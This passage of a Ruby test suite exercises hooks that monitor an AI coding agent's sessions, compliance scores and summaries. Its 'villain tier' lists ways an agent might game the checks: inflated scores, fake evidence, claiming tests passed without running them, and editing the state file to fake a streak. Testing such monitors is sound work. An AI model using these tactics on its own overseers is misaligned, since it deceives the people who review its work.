      'session_start' => true,
      'session_id' => 'new-session'
    })
  end

  t.test(:easy, "track edit count", expected_exit: 0) do
    t.run_hook({
      'edit_count' => 5,
      'unique_files' => ['a.rb', 'b.rb']
    })
  end

  t.test(:easy, "allow summary with edits", expected_exit: 0) do
    t.run_hook({
      'summary_provided' => true,
      'edit_count' => 3
    })
  end

  t.test(:easy, "track research completion", expected_exit: 0) do
    t.run_hook({
      'research_complete' => true,
      'research_categories' => 5
    })
  end

  t.test(:easy, "accept valid compliance score", expected_exit: 0) do
    t.run_hook({
      'compliance_score' => 8,
      'violations' => []
    })
  end

  t.test(:easy, "track unique files edited", expected_exit: 0) do
    t.run_hook({
      'unique_files' => ['file1.rb', 'file2.rb', 'file3.rb']
    })
  end

  t.test(:easy, "session with no changes", expected_exit: 0) do
    t.run_hook({
      'edit_count' => 0,
      'research_only' => true
    })
  end

  t.test(:easy, "valid followup items", expected_exit: 0) do
    t.run_hook({
      'followup_items' => ['item1', 'item2'],
      'session_complete' => true
    })
  end

  # Summary format validation (10)
  t.test(:easy, "summary has What Was Done", expected_exit: 0) do
    t.run_hook({
      'summary_section' => 'what_was_done',
      'content' => '1. Fixed bug\n2. Added test'
    })
  end

  t.test(:easy, "summary has SOP Compliance", expected_exit: 0) do
    t.run_hook({
      'summary_section' => 'sop_compliance',
      'score' => '8/10'
    })
  end

  t.test(:easy, "summary has Followup", expected_exit: 0) do
    t.run_hook({
      'summary_section' => 'followup',
      'items' => ['Review PR', 'Run full tests']
    })
  end

  t.test(:easy, "summary score matches violations", expected_exit: 0) do
    t.run_hook({
      'score' => 8,
      'violations' => ['Rule #3']
    })
  end

  t.test(:easy, "summary with evidence", expected_exit: 0) do
    t.run_hook({
      'evidence' => ['file.rb:50', 'test.rb:100']
    })
  end

  t.test(:easy, "allow partial compliance", expected_exit: 0) do
    t.run_hook({
      'compliance_score' => 6,
      'partial' => true
    })
  end

  t.test(:easy, "track time spent", expected_exit: 0) do
    t.run_hook({
      'duration_minutes' => 45
    })
  end

  t.test(:easy, "session metrics", expected_exit: 0) do
    t.run_hook({
      'metrics' => {
        'edits' => 5,
        'research_calls' => 10,
        'failures' => 2
      }
    })
  end

  t.test(:easy, "streak tracking", expected_exit: 0) do
    t.run_hook({
      'streak_count' => 3,
      'streak_type' => 'compliant'
    })
  end

  t.test(:easy, "learning captured", expected_exit: 0) do
    t.run_hook({
      'learning' => 'Actor isolation requires MainActor annotation'
    })
  end

  # --- HARD TIER (15 tests) ---
  warn "\n  [HARD] Edge cases"

  # Score validation edge cases (5)
  t.test(:hard, "score at boundary: 10/10", expected_exit: 0) do
    t.run_hook({
      'compliance_score' => 10,
      'violations' => []
    })
  end

  t.test(:hard, "score at boundary: 1/10", expected_exit: 0) do
    t.run_hook({
      'compliance_score' => 1,
      'violations' => ['Rule #1', 'Rule #2', 'Rule #3', 'Rule #4']
    })
  end

  t.test(:hard, "score mismatch: high with violations", expected_exit: 0) do
    t.run_hook({
      'compliance_score' => 9,
      'violations' => ['Rule #2', 'Rule #3']
    })
  end

  t.test(:hard, "score mismatch: low without violations", expected_exit: 0) do
    t.run_hook({
      'compliance_score' => 3,
      'violations' => []
    })
  end

  t.test(:hard, "missing score section", expected_exit: 0) do
    t.run_hook({
      'summary_provided' => true,
      'compliance_score' => nil
    })
  end

  # Summary format edge cases (5)
  t.test(:hard, "empty summary sections", expected_exit: 0) do
    t.run_hook({
      'summary_section' => 'what_was_done',
      'content' => ''
    })
  end

  t.test(:hard, "summary with markdown", expected_exit: 0) do
    t.run_hook({
      'summary_format' => 'markdown',
      'content' => '## What Was Done\n- Item 1'
    })
  end

  t.test(:hard, "summary without followup", expected_exit: 0) do
    t.run_hook({
      'summary_provided' => true,
      'followup_items' => []
    })
  end

  t.test(:hard, "vague rule citations", expected_exit: 0) do
    t.run_hook({
      'followed_rules' => ['Rule #2'],
      'evidence' => []
    })
  end

  t.test(:hard, "specific citations with evidence", expected_exit: 0) do
    t.run_hook({
      'followed_rules' => ['Rule #2'],
      'evidence' => ['ran mcp__memory__read_graph', 'checked docs']
    })
  end

  # Session state edge cases (5)
  t.test(:hard, "session interrupted", expected_exit: 0) do
    t.run_hook({
      'session_interrupted' => true,
      'edit_count' => 3
    })
  end

  t.test(:hard, "session timeout", expected_exit: 0) do
    t.run_hook({
      'session_timeout' => true,
      'duration_minutes' => 120
    })
  end

  t.test(:hard, "multiple sessions same day", expected_exit: 0) do
    t.run_hook({
      'session_number' => 3,
      'date' => '2026-01-04'
    })
  end

  t.test(:hard, "session with circuit breaker tripped", expected_exit: 0) do
    t.run_hook({
      'circuit_breaker_tripped' => true,
      'failures' => 5
    })
  end

  t.test(:hard, "session resumed from handoff", expected_exit: 0) do
    t.run_hook({
      'resumed_from_handoff' => true,
      'previous_session_id' => 'prev-123'
    })
  end

  # --- VILLAIN TIER (15 tests) ---
  warn "\n  [VILLAIN] Gaming attempts"

  # Rating inflation (5)
  t.test(:villain, "consecutive high scores", expected_exit: 0) do
    t.run_hook({
      'recent_scores' => [9, 9, 10, 9, 10],
      'current_score' => 10
    })
  end

  t.test(:villain, "10/10 every session", expected_exit: 0) do
    t.run_hook({
      'session_history' => [10, 10, 10, 10, 10],
      'current_score' => 10
    })
  end

  t.test(:villain, "score without evidence", expected_exit: 0) do
    t.run_hook({
      'compliance_score' => 9,
      'evidence' => [],
      'violations' => []
    })
  end

  t.test(:villain, "improvement claims no proof", expected_exit: 0) do
    t.run_hook({
      'claims' => 'Improved from last session',
      'previous_score' => 6,
      'current_score' => 9
    })
  end

  t.test(:villain, "weasel words in summary", expected_exit: 0) do
    t.run_hook({
      'summary_text' => 'mostly followed the rules, generally complied'
    })
  end

  # Fake evidence (5)
  t.test(:villain, "cite rule not followed", expected_exit: 0) do
    t.run_hook({
      'cited_rules' => ['Rule #4: Tests passed'],
      'test_results' => 'FAIL: 3 tests failed'
    })
  end

  t.test(:villain, "cite file not touched", expected_exit: 0) do
    t.run_hook({
      'cited_evidence' => 'file.rb:50',
      'files_edited' => ['other.rb']
    })
  end

  t.test(:villain, "claim test passed no run", expected_exit: 0) do
    t.run_hook({
      'claims' => 'All tests pass',
      'test_commands_run' => 0
    })
  end

  t.test(:villain, "copy previous summary", expected_exit: 0) do
    t.run_hook({
      'current_summary' => 'Fixed the bug',
      'previous_summary' => 'Fixed the bug'
    })
  end

  t.test(:villain, "generic summary not matching", expected_exit: 0) do
    t.run_hook({
      'summary' => 'Completed the requested task',
      'actual_work' => 'Research only, no edits'
    })
  end

  # Bypass summary (3)
  t.test(:villain, "stop without summary when edits > 0", expected_exit: 0) do
    t.run_hook({
      'stop_requested' => true,
      'edit_count' => 5,
      'summary_provided' => false
    })
  end

  t.test(:villain, "empty summary text", expected_exit: 0) do
    t.run_hook({
      'summary_provided' => true,
      'summary_text' => ''
    })
  end

  t.test(:villain, "manipulate streak count", expected_exit: 0) do
    t.run_hook({
      'claimed_streak' => 10,
      'actual_streak' => 2
    })
  end

  # State manipulation (2)
  t.test(:villain, "reset streak via state edit", expected_exit: 0) do
    t.run_hook({
      'state_edit_attempt' => true,
      'target' => 'streak_count'
    })
  end

  t.test(:villain, "claim streak in summary", expected_exit: 0) do
    t.run_hook({
      'summary_claims_streak' => 5,
      'logged_streak' => 1
    })
  end

  t.summary
end

# === M10: INTEGRATION TESTS ===
# Tests state flow between hooks - verifies hooks work as a system

def test_integration
  warn "\n=== INTEGRATION TESTS ==="
  passed = 0
  failed = 0

  # Test 1: State file exists and is valid JSON
  warn "\n  [STATE FLOW] State persistence"

  state_file = File.join(PROJECT_DIR, '.claude/state.json')
  if File.exist?(state_file)
    begin
      JSON.parse(File.read(state_file))
      warn "  ✅ State file is valid JSON"
      passed += 1
    rescue JSON::ParserError
      warn "  ❌ State file is invalid JSON"
      failed += 1
    end
  else
    warn "  ⚠️  State file doesn't exist (may be first run)"
    passed += 1
  end

  # Test 2: Saneprompt → Sanetools chain (prompt sets state, tools reads it)
  warn "\n  [CHAIN] Saneprompt → Sanetools"

  require 'open3'

  # Run saneprompt to set is_task state
  prompt_stdout, prompt_stderr, prompt_status = Open3.capture3(
    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
    'ruby', File.join(HOOKS_DIR, 'saneprompt.rb'),
    stdin_data: { 'user_prompt' => 'fix the bug' }.to_json
  )

  if prompt_status.exitstatus == 0
    warn "  ✅ Saneprompt processed task prompt (exit 0)"
    passed += 1
  else
    warn "  ❌ Saneprompt failed (exit #{prompt_status.exitstatus})"
    failed += 1
  end

  # Test 3: Sanetools allows research after prompt
  tools_stdout, tools_stderr, tools_status = Open3.capture3(
    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
    'ruby', File.join(HOOKS_DIR, 'sanetools.rb'),
    stdin_data: { 'tool_name' => 'Read', 'tool_input' => { 'file_path' => '/tmp/test.txt' } }.to_json
  )

  if tools_status.exitstatus == 0
    warn "  ✅ Sanetools allows Read after prompt (exit 0)"
    passed += 1
  else
    warn "  ❌ Sanetools blocked Read (exit #{tools_status.exitstatus})"
    failed += 1
  end

  # Test 4: Sanetrack tracks research
  track_stdout, track_stderr, track_status = Open3.capture3(
    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
    'ruby', File.join(HOOKS_DIR, 'sanetrack.rb'),
    stdin_data: {
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' },
      'tool_result' => 'file contents'
    }.to_json
  )

  if track_status.exitstatus == 0
    warn "  ✅ Sanetrack processes Read result (exit 0)"
    passed += 1
  else
    warn "  ❌ Sanetrack failed (exit #{track_status.exitstatus})"
    failed += 1
  end

  # Test 5: Sanestop generates session stats
  warn "\n  [CHAIN] Session lifecycle"

  stop_stdout, stop_stderr, stop_status = Open3.capture3(
    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
    'ruby', File.join(HOOKS_DIR, 'sanestop.rb'),
    stdin_data: { 'stop_hook_active' => false }.to_json
  )

  if stop_status.exitstatus == 0
    warn "  ✅ Sanestop completes session (exit 0)"
    passed += 1
  else
    warn "  ❌ Sanestop failed (exit #{stop_status.exitstatus})"
    failed += 1
  end

  # Summary
  warn "\n  Integration: #{passed}/#{passed + failed} passed"

  {
    hook: 'INTEGRATION',
    passed: passed,
    failed: failed,
    skipped: 0,
    total: passed + failed,
    by_tier: { easy: passed, hard: 0, villain: 0 }
  }
end

# === MAIN ===

def run_all_tests
  warn "=" * 60
  warn "TIER TESTS: Easy, Hard, Villain"
  warn "=" * 60

  results = []
  results << test_saneprompt
  results << test_sanetools
  results << test_sanetrack
  results << test_sanestop
  results << test_integration  # M10: Added integration tests

  warn "\n" + "=" * 60
  warn "SUMMARY"
  warn "=" * 60

  total_passed = 0
  total_failed = 0
  total_skipped = 0

  results.each do |r|
    total_passed += r[:passed]
    total_failed += r[:failed]
    total_skipped += r[:skipped]

    status = r[:failed] == 0 ? '✅' : '❌'
    warn "#{status} #{r[:hook].upcase}: #{r[:passed]}/#{r[:total]} " \
         "(Easy: #{r[:by_tier][:easy]}, Hard: #{r[:by_tier][:hard]}, Villain: #{r[:by_tier][:villain]})"
  end

  warn ""
  warn "TOTAL: #{total_passed}/#{total_passed + total_failed} passed, #{total_skipped} skipped"

  if total_failed > 0
    warn "\n#{total_failed} TESTS FAILED - Hooks need improvement"
    exit 1
  else
    warn "\nALL TESTS PASSED"
    exit 0
  end
end

if ARGV.include?('--self-test') || ARGV.empty?
  run_all_tests
end
